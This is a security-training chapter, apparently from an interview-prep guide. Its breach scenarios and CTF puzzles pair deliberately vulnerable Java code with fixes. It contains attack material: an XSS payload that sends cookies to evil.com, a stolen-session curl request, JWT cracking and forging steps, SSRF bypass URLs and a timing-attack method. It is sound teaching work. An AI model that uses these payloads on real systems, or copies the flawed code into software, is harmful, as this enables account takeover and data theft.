# 🏰 Security Scenarios & Puzzles — Test Your Skills Like a Pen Tester

> *"Theory without practice is like a sword without an edge. In this chapter, you won't just READ about security — you'll ATTACK and DEFEND real systems. Each scenario is inspired by actual breaches at real companies. Can you spot the vulnerability before the attacker does? Can you design a fix that actually works?"*

**⏱️ Estimated Time**: 75 minutes | **🎯 Difficulty**: 🔴 Hard | **🔗 Prerequisites**: All previous chapters

---

## 📋 Table of Contents
1. [How to Use This Chapter](#-how-to-use-this-chapter)
2. [Scenario 1: The Leaky API](#-scenario-1-the-leaky-api)
3. [Scenario 2: The Session Heist](#-scenario-2-the-session-heist)
4. [Scenario 3: The Crypto Catastrophe](#-scenario-3-the-crypto-catastrophe)
5. [Scenario 4: The Microservice Meltdown](#-scenario-4-the-microservice-meltdown)
6. [Scenario 5: The Supply Chain Surprise](#-scenario-5-the-supply-chain-surprise)
7. [War Game: Design Under Pressure](#-war-game-design-under-pressure)
8. [CTF Challenges: Crack the Code](#-ctf-challenges-crack-the-code)
9. [Real Breach Analysis](#-real-breach-analysis)
10. [Scoring & Certification](#-scoring--certification)

---

## 🎮 How to Use This Chapter

```
╔══════════════════════════════════════════════════════════════════╗
║                    RULES OF ENGAGEMENT                            ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  1. Read the scenario carefully                                  ║
║  2. Try to identify ALL vulnerabilities before revealing answers ║
║  3. Design your fix BEFORE checking the solution                 ║
║  4. Score yourself honestly                                      ║
║  5. Each scenario builds on knowledge from previous chapters     ║
║                                                                  ║
║  SCORING:                                                        ║
║    🎯 Identifying the vulnerability: +10 pts                    ║
║    🔧 Proposing correct fix: +15 pts                            ║
║    🏗️  Designing defense-in-depth: +25 pts                      ║
║    ⚡ Finding bonus/hidden issues: +10 pts each                  ║
║                                                                  ║
║  TARGET: 200+ points = Security Expert 👑                       ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## 🔓 Scenario 1: The Leaky API

### 📖 Background

> **Company**: FinanceApp (startup, 50K users, handling payments)
> **Stack**: Spring Boot 3 + PostgreSQL + React frontend
> **Situation**: A security researcher reports they can access other users' financial data

### 🕵️ The Vulnerable Code

```java
@RestController
@RequestMapping("/api/v1")
public class FinanceController {

    @GetMapping("/transactions")
    public List<Transaction> getTransactions(
            @RequestParam Long userId,
            @RequestParam(required = false) String startDate,
            @RequestParam(required = false) String endDate) {
        
        return transactionService.findByUserId(userId);
    }

    @GetMapping("/accounts/{accountId}/balance")
    public Map<String, Object> getBalance(@PathVariable String accountId) {
        Account account = accountRepo.findById(accountId).orElseThrow();
        return Map.of(
            "accountId", account.getId(),
            "balance", account.getBalance(),
            "ssn", account.getSsn(),
            "routingNumber", account.getRoutingNumber(),
            "createdAt", account.getCreatedAt()
        );
    }

    @PostMapping("/transfer")
    public ResponseEntity<?> transfer(@RequestBody TransferRequest req) {
        Account from = accountRepo.findById(req.getFromAccountId()).orElseThrow();
        Account to = accountRepo.findById(req.getToAccountId()).orElseThrow();
        
        if (from.getBalance().compareTo(req.getAmount()) >= 0) {
            from.setBalance(from.getBalance().subtract(req.getAmount()));
            to.setBalance(to.getBalance().add(req.getAmount()));
            accountRepo.save(from);
            accountRepo.save(to);
            return ResponseEntity.ok("Success");
        }
        return ResponseEntity.badRequest().body("Insufficient funds");
    }
}
```

### 🎯 Your Mission

1. Identify ALL security vulnerabilities (aim for 8+)
2. Classify each by severity (Critical/High/Medium/Low)
3. Propose a fix for each
4. Design a secure version of this API

<details>
<summary>🔍 Complete Analysis (Click after you've tried)</summary>

| # | Vulnerability | Type | Severity | Fix |
|---|---|---|---|---|
| 1 | No auth check on `/transactions` | IDOR | 🔴 Critical | Derive userId from JWT, not request param |
| 2 | userId as query param | IDOR | 🔴 Critical | `Authentication.getPrincipal().getId()` |
| 3 | SSN in balance response | Data Exposure | 🔴 Critical | Use DTO, never expose SSN |
| 4 | No ownership check on balance | IDOR | 🔴 Critical | Verify account belongs to authenticated user |
| 5 | No ownership check on transfer | IDOR | 🔴 Critical | Verify `fromAccount` belongs to caller |
| 6 | Race condition on transfer | TOCTOU | 🔴 High | Use `SELECT FOR UPDATE` or atomic SQL |
| 7 | No transaction boundary | Data Integrity | 🟡 Medium | `@Transactional` on transfer method |
| 8 | No input validation | Injection/Logic | 🟡 Medium | Validate amount > 0, date formats, etc. |
| 9 | No rate limiting | DoS | 🟡 Medium | Rate limit transfers per user |
| 10 | String date parsing without validation | Injection | 🟡 Medium | Use `@DateTimeFormat` |
| 11 | No audit logging | Compliance | 🟡 Medium | Log all financial operations |
| 12 | Negative amount not checked | Logic Flaw | 🟡 Medium | `@Positive` on amount field |

**Secure Version:**
```java
@RestController
@RequestMapping("/api/v1")
public class SecureFinanceController {

    @GetMapping("/transactions")
    public List<TransactionDTO> getTransactions(
            @AuthenticationPrincipal UserPrincipal user,
            @RequestParam @DateTimeFormat(iso = DATE) Optional<LocalDate> startDate,
            @RequestParam @DateTimeFormat(iso = DATE) Optional<LocalDate> endDate) {
        // userId derived from token, not request
        return transactionService.findByUserId(user.getId(), startDate, endDate)
            .stream().map(TransactionDTO::from).toList();
    }

    @GetMapping("/accounts/{accountId}/balance")
    @PreAuthorize("@accountSecurity.isOwner(#accountId, authentication)")
    public AccountSummaryDTO getBalance(@PathVariable UUID accountId) {
        // DTO excludes SSN, routing number, internal fields
        return AccountSummaryDTO.from(accountRepo.findById(accountId).orElseThrow());
    }

    @PostMapping("/transfer")
    @Transactional
    @RateLimiter(name = "transfer", fallbackMethod = "transferFallback")
    public ResponseEntity<?> transfer(
            @Valid @RequestBody TransferRequest req,
            @AuthenticationPrincipal UserPrincipal user) {
        // Verify ownership
        if (!accountService.isOwner(req.getFromAccountId(), user.getId())) {
            throw new ResponseStatusException(NOT_FOUND);
        }
        // Atomic transfer with pessimistic locking
        transferService.executeTransfer(req.getFromAccountId(), 
            req.getToAccountId(), req.getAmount(), user.getId());
        return ResponseEntity.ok(Map.of("status", "completed"));
    }
}
```
</details>

---

## 🕵️ Scenario 2: The Session Heist

### 📖 Background

> **Company**: SocialConnect (social media platform, 2M users)
> **Report**: Users report their accounts posting content they didn't write
> **Evidence**: All affected users recently clicked links in DMs

### 🕵️ The Attack Chain

```
STEP 1: Attacker discovers stored XSS in profile bio field
  Bio content: "Hey check out my site! <img src=x onerror='fetch(`https://evil.com/steal?c=${document.cookie}`)'>"

STEP 2: Attacker sends DMs with links to their profile
  "Hey! Love your posts. Check my profile: /users/attacker123"

STEP 3: Victim views attacker's profile
  → Bio renders → <img> tag fires onerror → JavaScript executes
  → Victim's session cookie sent to evil.com

STEP 4: Attacker uses stolen session to post as victim
  curl -H "Cookie: session=stolen_value" -X POST /api/posts -d '{"content":"Buy crypto!"}'
```

### 🎯 Your Mission

1. Where did the security fail? (Multiple layers)
2. Design a defense-in-depth solution that makes this attack impossible
3. What would you check in a code review to prevent this?

<details>
<summary>🔍 Complete Analysis</summary>

**Failures (each a separate fix needed):**

| # | Failure | Fix |
|---|---|---|
| 1 | Bio field not sanitized on INPUT | HTML sanitizer (allowlist safe tags) |
| 2 | Bio not encoded on OUTPUT | `th:text` or React auto-escaping (not `dangerouslySetInnerHTML`) |
| 3 | No CSP header | `Content-Security-Policy: script-src 'self'` blocks inline scripts |
| 4 | Cookie not HttpOnly | `Set-Cookie: session=x; HttpOnly` prevents JS access |
| 5 | Cookie not SameSite | `SameSite=Strict` limits cross-site usage |
| 6 | No rate limit on posting | Detect unusual posting frequency |
| 7 | No session anomaly detection | Flag session used from new IP/device |

**Defense-in-Depth Design:**
```
Layer 1: INPUT → Sanitize bio with OWASP HTML Sanitizer (strip scripts, events)
Layer 2: OUTPUT → Framework auto-escaping (never render raw HTML from users)
Layer 3: CSP → script-src 'self' 'nonce-xxx' (blocks ALL inline/injected scripts)
Layer 4: COOKIE → HttpOnly; Secure; SameSite=Strict (JS can't steal it)
Layer 5: SESSION → Bind to device fingerprint; invalidate on IP change
Layer 6: MONITORING → Alert on unusual session activity patterns
```

**Key insight**: Any SINGLE one of fixes 3, 4, or 5 would have prevented the theft. All together make it virtually impossible. This is defense-in-depth in action.
</details>

---

## 🔐 Scenario 3: The Crypto Catastrophe

### 📖 Background

> **Company**: HealthVault (stores medical records, HIPAA regulated)
> **Audit Finding**: Encryption implementation has critical flaws
> **Risk**: Patient medical records at risk of exposure

### 🕵️ The Flawed Implementation

```java
@Service
public class MedicalRecordEncryption {
    
    // "Encryption key" for all patient data
    private static final String SECRET_KEY = "MySecretKey12345";  // 128-bit
    private static final String IV = "0000000000000000";          // Fixed IV
    
    public String encrypt(String patientData) throws Exception {
        SecretKeySpec keySpec = new SecretKeySpec(SECRET_KEY.getBytes(), "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(IV.getBytes());
        
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
        
        byte[] encrypted = cipher.doFinal(patientData.getBytes());
        return Base64.getEncoder().encodeToString(encrypted);
    }
    
    public String decrypt(String encryptedData) throws Exception {
        SecretKeySpec keySpec = new SecretKeySpec(SECRET_KEY.getBytes(), "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(IV.getBytes());
        
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
        
        byte[] decrypted = cipher.doFinal(Base64.getDecoder().decode(encryptedData));
        return new String(decrypted);
    }
    
    public String hashPassword(String password) {
        return DigestUtils.md5Hex(password + "salt123");
    }
}
```

### 🎯 Your Mission

1. Find ALL cryptographic mistakes (aim for 8+)
2. Explain the impact of EACH mistake
3. Write a completely secure replacement

<details>
<summary>🔍 Complete Analysis</summary>

| # | Mistake | Impact | Fix |
|---|---|---|---|
| 1 | Hardcoded key in source code | Key in every code checkout, every developer has it | Store in HSM/KMS |
| 2 | Static/all-zeros IV | Same plaintext → same ciphertext (pattern analysis) | Random IV per encryption |
| 3 | AES-CBC without HMAC | Padding oracle attack → decrypt without key | Use AES-GCM (AEAD) |
| 4 | No integrity verification | Ciphertext can be modified undetected | GCM provides auth tag |
| 5 | Same key for all patients | Breach of one = breach of all | Per-patient DEK with envelope encryption |
| 6 | MD5 for password hashing | Broken, too fast, rainbow tables | bcrypt/Argon2id |
| 7 | Static salt ("salt123") | Same password = same hash (rainbow table) | Unique random salt per password |
| 8 | 128-bit key (string bytes) | Weak key derivation from string | Use KeyGenerator with 256-bit |
| 9 | No key rotation mechanism | Key compromised once = all data exposed forever | Implement key versioning + rotation |
| 10 | No audit of encryption/decryption | Can't detect unauthorized access | Log all decrypt operations |

**Secure Replacement:**
```java
@Service
public class SecureMedicalRecordEncryption {
    
    private final KmsClient kmsClient; // AWS KMS or Vault
    
    public EncryptedRecord encrypt(String patientData, String patientId) {
        // Generate per-record DEK
        byte[] dek = new byte[32]; // 256-bit
        SecureRandom.getInstanceStrong().nextBytes(dek);
        
        // Random IV for AES-GCM
        byte[] iv = new byte[12];
        SecureRandom.getInstanceStrong().nextBytes(iv);
        
        // Encrypt with AES-256-GCM
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, 
            new SecretKeySpec(dek, "AES"),
            new GCMParameterSpec(128, iv));
        cipher.updateAAD(patientId.getBytes()); // Bind ciphertext to patient
        byte[] ciphertext = cipher.doFinal(patientData.getBytes(UTF_8));
        
        // Envelope encryption: encrypt DEK with KMS master key
        byte[] encryptedDek = kmsClient.encrypt(dek, "alias/patient-data-key");
        Arrays.fill(dek, (byte) 0); // Zero out plaintext DEK
        
        // Audit
        auditLog.log("ENCRYPT", patientId, getCurrentUser());
        
        return new EncryptedRecord(iv, ciphertext, encryptedDek, "v2");
    }
}
```
</details>

---

## 🌐 Scenario 4: The Microservice Meltdown

### 📖 Background

> **Company**: E-ShopPlatform (e-commerce, 50 microservices, 10M users)
> **Incident**: Attacker compromised ONE microservice (product-catalog) and within 2 hours had access to payment data, user PII, and admin functions

### 🕵️ The Architecture (Before Breach)

```
                    ┌─────────────────────────────────────────┐
                    │          INTERNAL NETWORK                 │
                    │   (everything trusts everything)          │
                    │                                           │
[Internet] → [LB] → [API Gateway] → [Product Service]         │
                    │       │         [Order Service]           │
                    │       │         [Payment Service]         │
                    │       │         [User Service]            │
                    │       │         [Admin Service]           │
                    │       │         [Notification Service]    │
                    │                                           │
                    │   ALL services share:                     │
                    │     - Same database credentials           │
                    │     - Same service account (full access)  │
                    │     - No authentication between services  │
                    │     - Flat network (any → any)           │
                    │     - Shared secrets in environment vars  │
                    │                                           │
                    └─────────────────────────────────────────┘

ATTACK PATH:
  1. SQLi in product-catalog search → shell access
  2. Read environment variables → database credentials
  3. Same credentials work for ALL databases (shared!)
  4. Access user-service DB → all user PII
  5. Access payment-service DB → credit card data
  6. Call admin-service API directly → no auth → full admin access
```

### 🎯 Your Mission

1. Identify all architectural security failures
2. Design a secure microservice architecture
3. What principle violations enabled the lateral movement?

<details>
<summary>🔍 Complete Analysis & Secure Design</summary>

**Failures:**
| # | Failure | Principle Violated |
|---|---|---|
| 1 | No service-to-service authentication | Zero Trust |
| 2 | Shared database credentials | Least Privilege |
| 3 | Flat network (any service → any service) | Defense in Depth |
| 4 | No network segmentation | Blast Radius Minimization |
| 5 | No input validation on product search | Input Validation |
| 6 | Shared service account with full access | Least Privilege |
| 7 | Admin service accessible without auth | Defense in Depth |
| 8 | No monitoring/alerting on unusual access | Detection |

**Secure Architecture:**
```
[Internet] → [WAF] → [API Gateway (auth, rate limit)] 
                              │
              ┌───────────────┼───────────────┐
              │               │               │
    [Product Zone]    [Order Zone]    [Payment Zone (PCI)]
         │                │                │
    ┌────┴────┐      ┌───┴───┐       ┌───┴───┐
    │Product  │      │Order  │       │Payment│
    │Service  │      │Service│       │Service│
    │(read-only│      │       │       │       │
    │ DB user) │      │(own DB│       │(HSM,  │
    └────┬────┘      │ user) │       │own DB)│
         │           └───┬───┘       └───┬───┘
    [Product DB]     [Order DB]    [Payment DB]
    
    Each zone:
    ✅ Own database with unique, minimal-permission credentials
    ✅ Network policy: can only reach specific allowed services
    ✅ mTLS between services (verify identity)
    ✅ Service mesh authorization policies
    ✅ Per-service secrets (rotated independently)
    ✅ If product-service is compromised → can only read products
       Cannot reach payment DB, cannot call admin APIs
```
</details>

---

## 🎭 Scenario 5: The Supply Chain Surprise

### 📖 Background

> **Company**: DevToolsCo (developer tools, 500K users)
> **Discovery**: A popular npm package in your dependency tree (`event-listener-helper`) was sold to a new maintainer who added crypto-mining code in a patch version update

### 🕵️ The Attack

```
TIMELINE:
  Day 1:    Original maintainer sells package (4M weekly downloads) to unknown buyer
  Day 7:    New owner publishes v2.3.1 (patch version — auto-updated!)
            Changes: Added obfuscated code in postinstall script
  Day 8:    Package mines cryptocurrency using your CI/CD build servers
            AND exfiltrates environment variables (including secrets)
  Day 30:   Someone notices high CPU on build servers, investigates
  Day 31:   Realized: all CI/CD secrets (deploy keys, API tokens) were exfiltrated

YOUR DEPENDENCY:
  your-app
    └── popular-framework
        └── ui-component-library
            └── event-listener-helper@^2.3.0  ← Auto-updates to 2.3.1! 💀
```

### 🎯 Your Mission

1. How could this have been prevented?
2. What's your incident response plan NOW?
3. Design a supply chain security strategy

<details>
<summary>🔍 Complete Analysis</summary>

**Prevention (layers):**
| # | Control | How It Helps |
|---|---|---|
| 1 | Lock files (package-lock.json) | Exact versions, no auto-update |
| 2 | Pin dependencies | `2.3.0` not `^2.3.0` |
| 3 | Private registry/proxy | Cache packages, block unauthorized updates |
| 4 | Audit new versions before adoption | Review changelog, code diff |
| 5 | Disable postinstall scripts | `--ignore-scripts` or allowlist |
| 6 | Monitor for maintainer changes | Alerts on ownership transfer |
| 7 | SBOM (Software Bill of Materials) | Know exactly what's in your build |
| 8 | CI/CD with minimal secrets | Only inject secrets needed for that step |
| 9 | Separate build environments | Build can't access production secrets |
| 10 | Network egress filtering in CI | Block outbound connections during build |

**Incident Response NOW:**
```
IMMEDIATE (Hour 1):
  1. ⛔ Stop all deployments
  2. 🔑 Rotate ALL secrets that were in CI/CD environment
  3. 📋 List all systems those secrets could access
  4. 🔒 Revoke all deploy keys, API tokens, cloud credentials

SHORT-TERM (Day 1-3):
  5. 🔍 Audit: What did the attacker access with stolen secrets?
  6. 🔍 Check: Any unauthorized deployments or data access?
  7. 📌 Pin the dependency to last known-good version
  8. 🧹 Clean rebuild from scratch (don't trust cached artifacts)

LONG-TERM (Week 1-4):
  9. 📦 Implement private package registry
  10. 🔒 Implement least-privilege CI/CD secrets (per-step)
  11. 🚨 Add dependency monitoring (Socket.dev, Snyk)
  12. 📝 Post-mortem and update security practices
```
</details>

---

## ⚔️ War Game: Design Under Pressure

### 🎮 Challenge: Secure Design in 10 Minutes

> **Interviewer**: "You're building a secure file sharing system (like a simplified Dropbox). Users can upload files, share them with specific people, and set expiration dates. Design the security architecture. You have 10 minutes."

**Think through these aspects before revealing the answer:**
1. How do you authenticate users?
2. How do you authorize file access?
3. How do you store files securely?
4. How do you handle sharing links?
5. What are the biggest threats?

<details>
<summary>✅ Strong Answer (what interviewers want to hear)</summary>

```
SECURITY ARCHITECTURE:

1. AUTHENTICATION:
   → OAuth2 + OIDC (don't build our own auth)
   → MFA required for sensitive operations (delete, share externally)
   → Short-lived JWT (15 min) + refresh token rotation

2. AUTHORIZATION:
   → ACL per file: owner + explicit shares (user/group/link)
   → Capabilities: view, download, edit, re-share, delete
   → Check on every access (not just UI — API must enforce)
   → Share links: capability tokens (unguessable UUID + expiry)

3. FILE STORAGE:
   → Blob storage (S3) with SSE-C (server-side encryption, customer key)
   → Per-file encryption key (envelope encryption with KMS)
   → Pre-signed URLs for upload/download (never expose storage directly)
   → Virus scanning on upload (before sharing becomes possible)

4. SHARING:
   → Share links: https://app.com/share/{cryptographic-random-token}
   → Token maps to: file_id + permissions + expiry + creator
   → Optional: password-protected shares
   → Revocable: creator can invalidate share link

5. THREATS (STRIDE):
   → Spoofing: Stolen tokens → MFA + device binding
   → Tampering: File modified → integrity hash (SHA-256) stored on upload
   → Repudiation: "I didn't share that" → audit log of all share actions
   → Info Disclosure: Unauthorized access → encryption at rest + ACLs
   → DoS: 1TB file upload → file size limits, quota per user
   → Elevation: Share link escalation → capability model (link = specific perms only)

6. BONUS SECURITY:
   → Content-Type validation (prevent stored XSS via HTML file)
   → Separate domain for serving user files (isolate cookies)
   → Rate limiting on download (prevent bulk data exfiltration)
   → Watermarking for sensitive documents (track leaks)
```
</details>

---

## 🏴‍☠️ CTF Challenges: Crack the Code

### Challenge 1: The Broken Token (Difficulty: 🟡)

```
You intercept this JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MDAwMDAwMDB9.abc123signature

Decode the payload. Then answer:
1. How would you escalate privileges if the server uses a weak secret?
2. What if the server accepts "alg": "none"?
3. What if you know the server uses HS256 but you have the RSA public key?
```

<details>
<summary>🔓 Solutions</summary>

**Decoded payload**: `{"sub":"user123","role":"user","iat":1700000000}`

**Attack 1: Weak secret brute force**
```bash
# Use jwt-cracker or hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
# If secret is "password123" → resign token with role:"admin"
```

**Attack 2: Algorithm "none"**
```
Change header: {"alg":"none","typ":"JWT"}
Change payload: {"sub":"user123","role":"admin","iat":1700000000}
New token: base64(header).base64(payload).  (empty signature!)
```

**Attack 3: Algorithm confusion (RS256 → HS256)**
```
Server expects RS256 (asymmetric — public key verifies)
Attack: Send token with alg:"HS256", signed with the PUBLIC key
Server uses public key as HMAC secret → verifies! (confused!)
Fix: Server MUST enforce expected algorithm, never trust token's alg header
```
</details>

### Challenge 2: The Timing Attack (Difficulty: 🔴)

```java
// This API key validation is vulnerable. How would you exploit it?
@GetMapping("/secret-data")
public ResponseEntity<?> getSecretData(@RequestHeader("X-API-Key") String apiKey) {
    String expectedKey = "sk_live_a8f7c2e1b4d9f6a3";
    
    if (apiKey.length() != expectedKey.length()) {
        return ResponseEntity.status(401).build();
    }
    
    for (int i = 0; i < apiKey.length(); i++) {
        if (apiKey.charAt(i) != expectedKey.charAt(i)) {
            return ResponseEntity.status(401).build();
        }
        // Simulate some processing time per character
    }
    
    return ResponseEntity.ok("Top secret data here");
}
```

<details>
<summary>🔓 Exploitation Technique</summary>

**The Attack:**
1. Send key starting with 'a': `axxxxxxxxxxxxxxxxxx` → fails at position 0 → ~1ms
2. Send key starting with 's': `sxxxxxxxxxxxxxxxxxx` → fails at position 1 → ~2ms
3. Send key starting with 'sk': `skxxxxxxxxxxxxxxxxx` → fails at position 2 → ~3ms
4. Continue character by character, measuring response times
5. Longer response time = more characters matched = correct prefix!
6. Full key extracted in 18 × 62 = ~1,116 requests (not 62^18 brute force!)

**Statistical approach**: Send each character 100 times, average the response time. The correct character shows statistically higher average time.

**Fix**:
```java
// Constant-time comparison — always checks ALL characters
return MessageDigest.isEqual(
    apiKey.getBytes(StandardCharsets.UTF_8),
    expectedKey.getBytes(StandardCharsets.UTF_8)
);
```
</details>

### Challenge 3: The SSRF Labyrinth (Difficulty: 🔴)

```java
// The developer added "protections" against SSRF. Can you bypass them all?
@GetMapping("/fetch")
public byte[] fetchUrl(@RequestParam String url) throws Exception {
    URL parsedUrl = new URL(url);
    
    // "Protection" 1: Block localhost
    if (parsedUrl.getHost().equals("localhost") || parsedUrl.getHost().equals("127.0.0.1")) {
        throw new SecurityException("Blocked!");
    }
    
    // "Protection" 2: Block internal IPs
    if (parsedUrl.getHost().startsWith("10.") || parsedUrl.getHost().startsWith("192.168.")) {
        throw new SecurityException("Blocked!");
    }
    
    // "Protection" 3: Only allow HTTP/HTTPS
    if (!parsedUrl.getProtocol().equals("http") && !parsedUrl.getProtocol().equals("https")) {
        throw new SecurityException("Blocked!");
    }
    
    return new URL(url).openStream().readAllBytes();
}
```

<details>
<summary>🔓 Bypass Techniques (7 different ways!)</summary>

| # | Bypass | Example URL |
|---|---|---|
| 1 | IPv6 localhost | `http://[::1]/admin` |
| 2 | Decimal IP | `http://2130706433/` (= 127.0.0.1 in decimal) |
| 3 | Octal IP | `http://0177.0.0.1/` |
| 4 | DNS rebinding | `http://attacker.com/` (DNS resolves to 127.0.0.1) |
| 5 | URL with credentials | `http://evil@127.0.0.1:80/` |
| 6 | 169.254.x.x (metadata) | `http://169.254.169.254/latest/meta-data/` (not blocked!) |
| 7 | Redirect | `http://attacker.com/redirect` → 302 to `http://localhost/admin` |

**Proper fix:**
```java
// Resolve DNS FIRST, then check the resulting IP
InetAddress resolved = InetAddress.getByName(parsedUrl.getHost());
if (resolved.isLoopbackAddress() || resolved.isLinkLocalAddress() 
    || resolved.isSiteLocalAddress() || resolved.isAnyLocalAddress()) {
    throw new SecurityException("Internal addresses blocked");
}
// Also: don't follow redirects (or re-check after redirect)
// Also: use allowlist of permitted domains, not denylist of IPs
```
</details>

---

## 📊 Real Breach Analysis

### Case Study: Equifax Breach (2017) — 147M Records

```
TIMELINE:
  March 7:    Apache Struts CVE published (CVE-2017-5638)
  March 8:    Equifax's security team notified
  March 15:   Equifax runs vulnerability scan (but it MISSES the affected server)
  May 13:     Attackers exploit the unpatched server → initial access
  May-July:   Attackers move laterally for 76 DAYS undetected
              Exfiltrate 147M records (SSN, DOB, addresses)
  July 29:    Equifax discovers breach (only via expired SSL cert on inspection tool!)
  Sept 7:     Public disclosure

ROOT CAUSES:
  1. ❌ Unpatched known vulnerability (2 months!)
  2. ❌ Scan missed the affected server (asset inventory failure)
  3. ❌ No network segmentation (lateral movement)
  4. ❌ No encryption on stored PII
  5. ❌ No data exfiltration monitoring (76 days!)
  6. ❌ Expired SSL cert on security monitoring tool (!!)
  7. ❌ Single point of failure in patch management

WHAT WOULD HAVE PREVENTED IT:
  ✅ Automated patching within 48 hours of critical CVE
  ✅ Complete asset inventory (you can't protect what you don't know exists)
  ✅ Network segmentation (stop lateral movement)
  ✅ Encryption at rest (stolen data would be useless)
  ✅ DLP/exfiltration detection (alert on unusual data flows)
  ✅ Monitoring that monitors itself (alert on expired certs)
```

### 🎮 You're the CISO: What Would You Do?

> You're hired as Equifax's CISO 6 months before the breach. Budget: $10M. Time: 6 months. What do you prioritize?

<details>
<summary>💡 Priority Ranking (Limited Budget Strategy)</summary>

| Priority | Investment | Cost | Prevents |
|----------|-----------|------|----------|
| 1 | Automated patch management (all assets) | $1.5M | The initial exploit |
| 2 | Complete asset inventory + scanning | $1M | Missing the server |
| 3 | Network segmentation | $2.5M | Lateral movement (76 days) |
| 4 | DLP + exfiltration monitoring | $2M | 147M records leaving undetected |
| 5 | Encryption at rest for PII | $2M | Data uselessness if stolen |
| 6 | Security monitoring health checks | $1M | Expired cert issue |
| **Total** | | **$10M** | **The entire breach** |

**Key insight**: Items 1 and 2 alone ($2.5M) would have prevented the breach entirely. Security doesn't always require massive budgets — it requires covering the basics FIRST.
</details>

---

## 🏆 Scoring & Certification

### Calculate Your Score

| Section | Max Points | Your Score |
|---------|-----------|------------|
| Scenario 1: Leaky API (12 vulns × 10pts) | 120 | ___/120 |
| Scenario 2: Session Heist (7 fixes × 15pts) | 105 | ___/105 |
| Scenario 3: Crypto Catastrophe (10 mistakes × 10pts) | 100 | ___/100 |
| Scenario 4: Microservice Meltdown (8 failures × 10pts) | 80 | ___/80 |
| Scenario 5: Supply Chain (10 controls × 10pts) | 100 | ___/100 |
| War Game: Design (5 aspects × 20pts) | 100 | ___/100 |
| CTF Challenges (3 × 25pts) | 75 | ___/75 |
| **TOTAL** | **680** | **___/680** |

### Your Security Rank

| Score | Rank | Badge | What It Means |
|-------|------|-------|---------------|
| 0-150 | Awareness Level | 🐣 | You know security exists — keep learning! |
| 151-300 | Practitioner | 🔰 | You can identify common vulnerabilities |
| 301-450 | Security Engineer | 🛡️ | You can design and implement secure systems |
| 451-580 | Security Architect | 🏗️ | You can design security for complex systems |
| 581-680 | Security Master | 👑 | You think like an attacker AND a defender |

---

## 🔗 What's Next?

| Topic | Link | Why? |
|-------|------|------|
| Security Interview Cheatsheet | [07_Security_Interview_CheatSheet.md](./07_Security_Interview_CheatSheet.md) | Quick reference for interview day |
| OWASP Top 10 | [../OWASP_Top10.md](../OWASP_Top10.md) | Deep dive into each vulnerability |
| Zero Trust Architecture | [../ZeroTrust_Architecture.md](../ZeroTrust_Architecture.md) | Modern security architecture patterns |

---

*[← Java Security Deep Dive](./05_Java_Security_Deep_Dive_QA.md) | [Back to Security Index](../README.md) | [Next: Interview Cheatsheet →](./07_Security_Interview_CheatSheet.md)*
